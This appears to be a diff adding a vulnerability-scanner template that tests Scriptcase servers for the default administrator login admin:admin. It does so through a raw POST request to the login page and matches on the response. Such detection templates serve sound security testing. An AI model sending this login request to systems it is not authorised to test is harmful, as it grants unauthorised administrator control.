@@ -1,0 +1,34 @@
+id: scriptcase-default-password
+
+info:
+  name: Scriptcase Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Scriptcase suffers from a default password vulnerability where attackers can control the platform using default credentials `admin:admin` and operate core functions with administrator rights.
+  tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /scriptcase/devel/iface/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        ajax=nm&option=login&field_user=admin&field_pass=admin&form_login=1&language=zh_CN&keep_logged=true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: regex
+        regex:
+          - "__#@#__"
+      - type: word
+        words:
+          - "Disconnect this user"
+        part: body
+      - type: word
+        words:
+          - "error1:user_connected"
+        part: body
